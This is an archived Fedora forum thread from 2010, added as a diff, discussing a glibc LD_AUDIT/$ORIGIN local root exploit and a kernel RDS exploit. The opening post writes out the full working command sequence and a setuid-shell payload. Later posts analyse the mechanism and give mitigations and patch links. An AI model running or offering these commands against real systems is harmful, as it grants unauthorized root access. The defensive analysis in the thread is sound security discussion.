@@ -1,0 +1,532 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US"><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+	<meta name="keywords" content=" Become root without root password, fedoraforum,fedora support,fedora tech,fedora,fedora linux,fedora project,linux,,linux operating system,linux software,learn linux,linux hosting,linux server,linux driver,linux support,linux kernel,linux distribution,linux command,fedora core,core,linux tutorial,linux security,linux gallery,linux wallpaper,linux help,fedora help,fedora forums,fedora discussions,gnome,kde,xorg,samba,firefox,mozilla,mplayer,konqueror,bluecurve,xine,xmms,bittorrent,torrent,linux tutorial,linux reviews,fc8,fc9,fc10,fc11,fc12,f8,f9,f10,f11,f12,f13,f14,f15,f16,f17,forum,forums,kernel,install">
+	<meta name="description" content="[Archive]  Become root without root password Security and Privacy">
+	
+	<title> Become root without root password [Archive]  - FedoraForum.org</title>
+	<link rel="stylesheet" type="text/css" href="t-253036_files/archive.css">
+</head>
+<body>
+<div class="pagebody">
+<div id="navbar"><a href="http://forums.fedoraforum.org/archive/index.php">FedoraForum.org</a> &gt; <a href="http://forums.fedoraforum.org/archive/index.php/f-125.html">Fedora 19/20</a> &gt; <a href="http://forums.fedoraforum.org/archive/index.php/f-44.html">Security and Privacy</a> &gt;  Become root without root password</div>
+<hr>
+<div class="pda"><a href="http://forums.fedoraforum.org/archive/index.php/t-253036.html?pda=1" rel="nofollow">PDA</a></div>
+<p class="largefont">View Full Version : <a href="http://forums.fedoraforum.org/showthread.php?t=253036">Become root without root password</a></p>
+<hr>
+
+<div class="post"><div class="posttop"><div class="username">sonoran</div><div class="date">20th October 2010, 04:05 AM</div></div><div class="posttext">I found this on Bee's website. For more info on this exploit there are links there:<br>
+http://honeybeenet.phpbb3now.com/viewtopic.php?f=6&amp;t=332<br>
+<br>
+All you have to do in Fedora 13 is enter the following lines in a shell as normal user:<br>
+cd /tmp<br>
+mkdir /tmp/exploit<br>
+ln /bin/ping /tmp/exploit/target<br>
+exec 3&lt; /tmp/exploit/target<br>
+rm -rf /tmp/exploit/<br>
+echo 'void __attribute__((constructor)) init(){setuid(0);system("/bin/bash");}' &gt; payload.c<br>
+gcc -w -fPIC -shared -o /tmp/exploit payload.c<br>
+LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3<br>
+<br>
+...and you are now root without entering the root password.<br>
+<br>
+I don't think this can be considered solely an "upstream" problem, 
+because I first tried it in Arch using the same version of glibc, and 
+the final command causes both gnome-terminal and xterm windows to 
+disappear. Scary.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">brunson</div><div class="date">20th October 2010, 04:40 AM</div></div><div class="posttext">Well ain't that a *****.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">mndar</div><div class="date">20th October 2010, 08:05 AM</div></div><div class="posttext">Quite extraordinary. Its explained well on the source website.<br>
+http://www.exploit-db.com/exploits/15274/</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">sonoran</div><div class="date">20th October 2010, 08:41 AM</div></div><div class="posttext">It's
+ just a local exploit, but still... The next time someone posts here 
+about forgetting his root password I will be sorely tempted.<br>
+<br>
+What's interesting to me is that while it works in Fedora, when you try 
+it in Arch your terminal self-destructs. I searched the Arch logs but 
+found nothing. It's like an annoyed parent snatching a dangerous object 
+away from a child - "Don't play with that, you could hurt yourself!"</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">Dangermouse</div><div class="date">20th October 2010, 09:05 AM</div></div><div class="posttext">What's interesting to me is that while it works in Fedora<br>
+It doesnt in F14, for me it crashes the terminal etc..</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">mndar</div><div class="date">20th October 2010, 09:11 AM</div></div><div class="posttext">Need Security Update...Now!!<br>
+Anyway, doesn't work on Gentoo. gcc 4.3.4 with glibc 2.9<br>
+line 4: /tmp/exploit/target: Permission denied<br>
+Neither does it work with Ubuntu 8.04 LTS<br>
+Inconsistency detected by ld.so: dl-open.c: 271: dl_open_worker: Assertion `(call_map)-&gt;l_name[0] == '\0'' failed!</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">leigh123linux</div><div class="date">20th October 2010, 09:20 AM</div></div><div class="posttext">Need Security Update...Now!!<br>
+Anyway, doesn't work on Gentoo. gcc 4.3.4 with glibc 2.9<br>
+line 4: /tmp/exploit/target: Permission denied<br>
+Neither does it work with Ubuntu 8.04 LTS<br>
+Inconsistency detected by ld.so: dl-open.c: 271: dl_open_worker: Assertion `(call_map)-&gt;l_name[0] == '\0'' failed!<br>
+<br>
+It's fixed in the latest glibc package<br>
+<br>
+<br>
+http://koji.fedoraproject.org/koji/buildinfo?buildID=201079</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">sonoran</div><div class="date">20th October 2010, 09:57 AM</div></div><div class="posttext">Whew! I'll sleep better. Thanks Leigh.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">marriedto51</div><div class="date">20th October 2010, 10:17 AM</div></div><div class="posttext">Thanks
+ for the info. It works in F12, too, but (as far as I can see from the 
+updates site) there is no pending update to glibc for F12.<br>
+<br>
+What about the other exploit listed on 
+http://www.exploit-db.com/exploits/15274/ (involving filling a pipe with
+ junk)? I can't get it to work, but then I don't fully understand it.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">johno12345</div><div class="date">20th October 2010, 01:07 PM</div></div><div class="posttext">naughty that one!<br>
+I'll have to watch out for that here incase our users start using it.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">WilliamHerry</div><div class="date">20th October 2010, 01:30 PM</div></div><div class="posttext">bugs everywhere</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">lineak</div><div class="date">20th October 2010, 01:40 PM</div></div><div class="posttext">Oh, that's easy&#8230;</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">jpollard</div><div class="date">20th October 2010, 02:07 PM</div></div><div class="posttext">Yup.<br>
+<br>
+Another reason (actually, this is the best one yet) to ALWAYS mount /tmp<br>
+nosetuid, nosetgid...<br>
+<br>
+And ALWAYS mount user writeable filesystems nosetuid,nosetgid.<br>
+<br>
+This has been my policy since about 1992... and I think it a good one<br>
+for everything.<br>
+<br>
+Might also call for a tweak to SELinux labels to block this too.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">assen</div><div class="date">20th October 2010, 08:35 PM</div></div><div class="posttext">Hi,<br>
+<br>
+Well, it's an extraordinary day today. It has been long since I've seen 
+two (!) zero-day local root exploits for Linux in less than 24 hours. 
+Since you've seen the glibc one, here's the next gem: kernel privilege 
+escalation against RDS protocol: 
+http://www.vsecurity.com/download/tools/linux-rds-exploit.c<br>
+<br>
+WWell,</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">sonoran</div><div class="date">20th October 2010, 11:08 PM</div></div><div class="posttext">Thanks
+ for the info. It works in F12, too, but (as far as I can see from the 
+updates site) there is no pending update to glibc for F12.<br>
+<br>
+What about the other exploit listed on 
+http://www.exploit-db.com/exploits/15274/ (involving filling a pipe with
+ junk)? I can't get it to work, but then I don't fully understand it.<br>
+<br>
+I can't reproduce that one either - all of this is way over my head technically.:confused:</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">mndar</div><div class="date">20th October 2010, 11:41 PM</div></div><div class="posttext">From the linux-rds-exploit.c file * The vulnerability is yet another example of why you shouldn't<br>
+ * allow loading of random packet families unless you actually<br>
+ * need them.Excellent point.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">jpollard</div><div class="date">21st October 2010, 02:52 AM</div></div><div class="posttext">What is being done is to exploit a race condition.<br>
+<br>
+First the hard link to a privileged program. Fill stderr with junk so that<br>
+when the privileged program is run (and errors out) it cannot write the<br>
+error.. This hangs the program until the substitution can take place.<br>
+<br>
+Once the substitution is active, empty stderr... Now the substitute is<br>
+privileged.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">stevea</div><div class="date">21st October 2010, 06:09 AM</div></div><div class="posttext">bugs everywhere<br>
+<br>
+And so many places for them to hide.<br>
+<br>
+Yup.<br>
+<br>
+Another reason (actually, this is the best one yet) to ALWAYS mount /tmp<br>
+nosetuid, nosetgid...<br>
+<br>
+And ALWAYS mount user writeable filesystems nosetuid,nosetgid.<br>
+<br>
+What about capabilities ?    Security by unusability isn't a good idea.<br>
+Actually I don't  understand why removing read permissions from all setuids isn't a solution.<br>
+<br>
+Like this ...<br>
+[stevea@luchs Desktop]$ ls -l /bin/ping<br>
+-rwsr-xr-x 1 root root 42136 Aug  5 04:19 /bin/ping<br>
+[stevea@luchs Desktop]$ sudo chmod -r /bin/ping<br>
+[stevea@luchs Desktop]$ ls -l /bin/ping<br>
+--ws--x--x 1 root root 42136 Aug  5 04:19 /bin/ping<br>
+<br>
+Then the exploit does this ....<br>
+[stevea@luchs Desktop]$ cd /tmp<br>
+[stevea@luchs tmp]$ mkdir /tmp/exploit<br>
+[stevea@luchs tmp]$ ln /bin/ping /tmp/exploit/target<br>
+[stevea@luchs tmp]$ exec 3&lt; /tmp/exploit/target<br>
+bash: /tmp/exploit/target: Permission denied<br>
+<br>
+If you can't open the setuid prog for either read or write, then you can only exec it.<br>
+Of course then you can't use 'file', 'size' or 'ldd' in the binary - modest cost.<br>
+<br>
+Of course fixing the system setuid progs is the big issue, but we have 
+two other issues.   A user creating any readable setuid prog is 
+effectively giving every person who can read it permission to execute 
+anything in their name.  So the nosetuid stuff is still required.   The 
+other issue is that a setuid prog with ACL readability confers the same 
+exploit feature.<br>
+--<br>
+<br>
+The other heartburn I have from the first exploit - how can this possibly be a glibc error ?<br>
+If so then why can't I just create a 'bad' glibc and use that by 
+manipulating LD_LIBRARY and create an exploit ?  Perhaps I 
+misunderstand.<br>
+<br>
+====<br>
+<br>
+The second exploit is more spectacular.   You do a  recvfrom(sock, 
+address, ...); and the incoming data overwrites any address including 
+kernel addresses.    That's incredible and the only stop-gap measure I 
+can think of is to disallow reading sockets.  Even the worst 
+storm-trooping sysadmin wouldn't suggest that I hope.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">jpollard</div><div class="date">21st October 2010, 01:09 PM</div></div><div class="posttext">The other heartburn I have from the first exploit - how can this possibly be a glibc error ?<br>
+If so then why can't I just create a 'bad' glibc and use that by 
+manipulating LD_LIBRARY and create an exploit ? Perhaps I misunderstand.<br>
+<br>
+<br>
+The exec system call uses the privileged program loader - which is part<br>
+of glibc as it shares the same loader function. Personally, I don't see why<br>
+it isn't separate, other than the bit of code duplication.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">AndrewSerk</div><div class="date">21st October 2010, 04:44 PM</div></div><div class="posttext">I have my /tmp in F13 like this in fstab:<br>
+none /tmp tmpfs uid=0,gid=0,mode=1777,size=256m<br>
+<br>
+And when I try the first exploit I get:<br>
+$ mkdir /tmp/exploit<br>
+$ ln /bin/ping /tmp/exploit/target<br>
+ln: creating hard link `/tmp/exploit/target' =&gt; `/bin/ping': Invalid cross-device link<br>
+<br>
+Unless I am missing something it would appear it no work here.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">stevea</div><div class="date">21st October 2010, 05:09 PM</div></div><div class="posttext">Andrew
+ - that is b/c you can't create a hard link across mountpoints.  Also 
+soft links won't work with this exploit  (unless you have permission to 
+delete /bin/ping or comparable).<br>
+<br>
+So it seems that it's sufficient top prevent all users from writing to 
+the same mount  that contains any root-setuid programs.  IOW make sure 
+no directory on "/" root is user writable and use separate /home and 
+/tmp and ... .<br>
+<br>
+Of course that doesn't prevent users from creating their own user-setuid
+ programs and then another user exploiting the first user - but that's 
+chipmonk nuts compared with a root exploit.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">jpollard</div><div class="date">21st October 2010, 05:26 PM</div></div><div class="posttext">Hi,<br>
+<br>
+Well, it's an extraordinary day today. It has been long since I've seen 
+two (!) zero-day local root exploits for Linux in less than 24 hours. 
+Since you've seen the glibc one, here's the next gem: kernel privilege 
+escalation against RDS protocol: 
+http://www.vsecurity.com/download/tools/linux-rds-exploit.c<br>
+<br>
+WWell,<br>
+<br>
+This one is fixed in 2.6.36 (just tested it).<br>
+<br>
+No problem installing the kernel (used the config from 2.6.34.7-56), 
+make gconfig, make, make modules, su, make install, make 
+modules_install.<br>
+<br>
+Showed up in /boot a vmlinuz.2.6.36.<br>
+<br>
+The other problem still exists though, and does need a<br>
+non-kernel update</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">AndrewSerk</div><div class="date">21st October 2010, 06:03 PM</div></div><div class="posttext">Andrew
+ - that is b/c you can't create a hard link across mountpoints.  Also 
+soft links won't work with this exploit  (unless you have permission to 
+delete /bin/ping or comparable).<br>
+<br>
+So it seems that it's sufficient top prevent all users from writing to 
+the same mount  that contains any root-setuid programs.  IOW make sure 
+no directory on "/" root is user writable and use separate /home and 
+/tmp and ... .<br>
+<br>
+Of course that doesn't prevent users from creating their own user-setuid
+ programs and then another user exploiting the first user - but that's 
+chipmonk nuts compared with a root exploit.<br>
+<br>
+Thank you Stevea,<br>
+Very interesting</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">stevea</div><div class="date">21st October 2010, 06:33 PM</div></div><div class="posttext">The exec system call uses the privileged program loader - which is part<br>
+of glibc as it shares the same loader function. Personally, I don't see why<br>
+it isn't separate, other than the bit of code duplication.<br>
+<br>
+Not a satisfying answer.   I've studied the shared lib mechanism on the 
+OSes I work on, but not Linux (not in detail), so seems odd behavior to 
+me. We have the same dlclose(), dlerror(), dlopen(), and dlsym() POSIX 
+interface, but the implementation is distinct.<br>
+<br>
+The immediate reason why my suggestion fails is that the library ignores
+ the LD_LIBRARY_PATH if the prog is setuid.   That's a pretty weak fence
+ I think. <br>
+<br>
+So the example exploit opens a setuid prog as input to fd3 , deletes the
+ setuid prog, then sets the fd3 input from the little shared library 
+with ".. init() { setuid(0); system("/bin/bash"); }".   I agree the 
+exploit is dependent on the $ORIGIN to cause the glibc to execute the 
+exploit library init with privilege - but why would any of that exec 
+ever have privilege once the ping link is deleted ?    Obviously the 
+privilege is retained from the deleted link to ping opened as input to 
+fd3, which makes little sense to me.<br>
+<br>
+Anyway the point is that glibc is nothing but another userspace library.
+  If it can decide (incorrectly)  which  libs are init'ed with 
+privilege, then I can write a blackhat-glibc to do so regardless of the 
+fix in the official glibc.  That leaves /etc/ld.so* as a honeypot for 
+exploits.  I read of ppl adding /usr/local/lib to the standard paths all
+ the time ... very bad idea.<br>
+<br>
+The idea that the library code is deciding based on paths and variables 
+like $ORIGIN gives only a slim hope for any sort of security.<br>
+<br>
+==<br>
+<br>
+The second exploit is more astonishing !   Why are kernel code maps even
+ writable ?   I'd rather see a privileged exception &amp; crash.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">jpollard</div><div class="date">21st October 2010, 09:37 PM</div></div><div class="posttext">Because the ping link is still open, that means it isn't deleted until<br>
+the last open fd against the file is closed.<br>
+<br>
+And it isn't the library code directly - it is linked into /lib/ld-linux.so, an<br>
+executable - not a library, used by the exec system call to link together<br>
+every program you try to exec.<br>
+<br>
+Its primary purpose is to read ELF binaries (and shared libraries) to<br>
+resolve symbols at runtime. As an executable, it inherits the privileges<br>
+of the base binary that is being executed (as in setuid).<br>
+<br>
+What I don't know is whether the actual starting address of executables<br>
+is in this file or in the base executable where the "main" function is.<br>
+<br>
+You can't manipulate the original binary (and this manipulation shouldn't<br>
+work either) because the reference to ld-linux.so is embedded in the<br>
+base executable.<br>
+<br>
+The vulnerability also would not work if the setuid program used static<br>
+linking and not shared libraries because ld-linux.so would have no<br>
+global symbols to resolve.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">stevea</div><div class="date">22nd October 2010, 09:42 AM</div></div><div class="posttext">Because the ping link is still open, that means it isn't deleted until<br>
+the last open fd against the file is closed.<br>
+<br>
+Yes, of course, but<br>
+1/ the binary for ping is never executed in this case  If you strace it 
+you'll see that pings shared libs aren't loaded instead /tmp/exploit's 
+are.  I suppose it's possible that the init is called as soon as that 
+libraries dependencies are loaded ... seems odd.<br>
+2/ the /tmp/exploit is never referenced but it IS executed due to the 
+$ORIGIN tag, which I don't completely understand.   How exactly does 
+that resolve make sense ?<br>
+<br>
+<br>
+[pid 15774] execve("/proc/self/fd/3", ["/proc/self/fd/3"], [/* 94 vars */]) = 0<br>
+... (nothing special here)<br>
+[pid 15774] readlink("/proc/self/exe", "/tmp/exploit/target (deleted)", 4096) = 29<br>
+[pid 15774] open("/tmp/exploit", O_RDONLY) = 4<br>
+[pid 15774] read(4, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\22 0\3\0\0004\0\0\0"..., 512) = 512<br>
+... loaded<br>
+... more libs loaded but not libidn ???? .... it is searching exploit's refs.<br>
+<br>
+.... the ping's libidn.so is never loaded, but /tmp/exploit's init is called ?<br>
+<br>
+So the readlink produces a useless string "/tmp/exploit/target 
+(deleted)", then then the strange bit, related somehow to the $ORIGIN 
+setting,  is that the nascent process backs up the path to 
+"/tmp/exploit" and execs that !!!<br>
+<br>
+And it isn't the library code directly - it is linked into /lib/ld-linux.so, an<br>
+executable - not a library, used by the exec system call to link together<br>
+every program you try to exec.<br>
+<br>
+Its primary purpose is to read ELF binaries (and shared libraries) to<br>
+resolve symbols at runtime. As an executable, it inherits the privileges<br>
+of the base binary that is being executed (as in setuid).<br>
+<br>
+Thanks - that implementation had sipped my mind. <br>
+<br>
+What I don't know is whether the actual starting address of executables<br>
+is in this file or in the base executable where the "main" function is.<br>
+<br>
+The .interp section of a dynamically linked executable refers to ld-linux.so and the <br>
+.dynstr section contains the shared lib names and the referenced symbols names,<br>
+so ld-linux executes before the app executable.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">jpollard</div><div class="date">22nd October 2010, 01:21 PM</div></div><div class="posttext">I believe the $ORIGIN gets interpreted based on the open file path - which<br>
+terminates in the /tmp/exploit..<br>
+<br>
+Personally, I don't thing exec should accept the use of a fd for an executable.<br>
+<br>
+Thanks - that also explains the startup, which is similar to what I thought, but<br>
+not quite the same.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">stevea</div><div class="date">22nd October 2010, 03:46 PM</div></div><div class="posttext">I believe the $ORIGIN gets interpreted based on the open file path - which<br>
+terminates in the /tmp/exploit..<br>
+<br>
+Yeah - I get that, but ... hmm So $ORIGIN refers the the working 
+directory of the hard link "/tmp/exploit" which we delete and replace 
+with a naughty shared object.   Ping really does start, but as we've 
+given it a LD_AUDIT=$ORIGIN that lib loads and inits first and ... bam. <br>
+<br>
+This exploit doesn't work if you add a suffix to origin like 
+$ORIGIN/../foo.so ,  so the only exploit seems to be  to replace the 
+directory containing the setuid prog.<br>
+<br>
+ Personally, I don't thing exec should accept the use of a fd for an 
+executable. I get your meaning, and in he old days before /proc you 
+couldn't.  What is happening here is that exec gets a string which it 
+tries to interpret in userspace as a path.   That path "/proc/self/fd/3"
+ is just a soft link  (to "/tmp/exploit/target"), so readlink is called 
+(by ld-linux.so ???) to translate it and it returns the result string 
+... "   "/tmp/exploit/target (deleted)" as shown in the strace, which I 
+think could have been the end of the story.  <br>
+<br>
+But yes, maybe the problem is that command line manipulation about 
+loading libraries MUST be ignored for setuid progs.   A setuid prog will
+ already ignore and LD_LIBRARY_PATH revisions, so why would it accept an
+ external LD_AUDIT  ?</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">jpollard</div><div class="date">22nd October 2010, 05:10 PM</div></div><div class="posttext">You are right - I missed the exec was not actually executing a fd (exec is a<br>
+no-op in this, only the redirection takes place)<br>
+<br>
+And the loader really really must ignore the users environment with<br>
+setuid programs.<br>
+<br>
+To me, this would appear to be the bug. And disabling the users environment<br>
+is tricky too - as the contents of that environment are/can<br>
+be used by the program (ie- "su" vs "su -"). So the environment has to<br>
+be passed, and the loader has to properly ignore it for setuid programs.<br>
+<br>
+Completely.<br>
+<br>
+A long time ago, it happened with the LD_LIBRARY_PATH...</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">stevea</div><div class="date">22nd October 2010, 11:03 PM</div></div><div class="posttext">Yeah - I think that only ld-linux needs to ignore (not delete) the environment when it is managing a setuid/setgid.<br>
+<br>
+Anyway we may both be wrong in our detailed understanding, but the 
+genius of open source is that there are a thousand folks like us, some 
+with a lot more time and interest,  looking over the shoulders of the 
+implementers.  Obviously this exploit was discovered by someone like 
+that, with access to source and not a hacker for good reasons.<br>
+<br>
+.</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">AndrewSerk</div><div class="date">23rd October 2010, 01:23 AM</div></div><div class="posttext">FYI
+ for anyone interested kernel-2.6.34.7-62.fc13 has the fix for 
+depessimize-rds_copy_page_user.patch: Fix CVE-2010-3904, local privilege
+ escalation via RDS protocol and is available from koji as of Fri Oct 22
+ 2010 16:22:05 UTC. I am running it but not long enough to vouch for 
+it's stability. :)<br>
+<br>
+Thanks Kyle</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">stevea</div><div class="date">26th October 2010, 07:41 AM</div></div><div class="posttext">The RDS problem has been around since the .6.30 kernel.<br>
+<br>
+There is a simple modprobe config to prevent it.<br>
+http://forums.fedoraforum.org/showthread.php?t=253278<br>
+<br>
+I'll suggest this is a good idea for anyone running F13 or earlier w/ a 2.6.30 or later kernel.<br>
+<br>
+==<br>
+<br>
+The ping/setuid program issue can be evaded by making all setuid programs non-readable except by other.<br>
+<br>
+To examine the setuid progs as root  ..<br>
+find / -xdev \( -perm -4000 \) -type f | xargs ls -l<br>
+To make then unreadable by other ....<br>
+find / -xdev \( -perm -4000 \) -type f | xargs chmod o-r<br>
+<br>
+You may want to make the few that have non-root group ownership non-readable by group too.  Fore example:<br>
+<br>
+-rwsr-x---. 1 backuppc apache    3993 May 17 14:12 /usr/share/BackupPC/sbin/BackupPC_Admin<br>
+needs a "chmod g-r  /usr/share/BackupPC/sbin/BackupPC_Admin"</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">manoranjan2050</div><div class="date">31st October 2010, 07:07 AM</div></div><div class="posttext">thanks its works</div></div><hr>
+
+
+<div class="post"><div class="posttop"><div class="username">Arimus</div><div class="date">4th November 2010, 04:21 PM</div></div><div class="posttext">Oh errr.... nasty ;)<br>
+<br>
+Though interestingly... if you run it as root it fails :p (I'd forgot I'd su'd to root earlier...)<br>
+<br>
+Luckily the one system I have that potentially can be used by other people doesn't have a compiler... :)</div></div><hr>
+
+
+<div id="copyright">vBulletin® v3.8.7, Copyright ©2000-2014, vBulletin Solutions, Inc.</div>
+</div>
+<script type="text/javascript" async="" src="t-253036_files/quant.js"></script><script src="t-253036_files/ga.js" async="" type="text/javascript"></script><script type="text/javascript">
+
+  var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-170932-2']);
+      _gaq.push(['_trackPageview']);
+      
+        (function() {
+            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+                    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+                      })();
+                      
+                      </script>
+                      <!-- Quantcast Tag -->
+                      <script type="text/javascript">
+                      var _qevents = _qevents || [];
+                      
+                      (function() {
+                      var elem = document.createElement('script');
+                      elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
+                      elem.async = true;
+                      elem.type = "text/javascript";
+                      var scpt = document.getElementsByTagName('script')[0];
+                      scpt.parentNode.insertBefore(elem, scpt);
+                      })();
+                      
+                      _qevents.push({
+                      qacct:"p-c9j7Vl3QwSLXU"
+                      });
+                      </script>
+                      
+                      <noscript>
+                      <div style="display:none;">
+                      <img src="//pixel.quantserve.com/pixel/p-c9j7Vl3QwSLXU.gif" border="0" height="1" width="1" alt="Quantcast"/>
+                      </div>
+                      </noscript>
+                      <!-- End Quantcast tag -->
+
+</body></html>
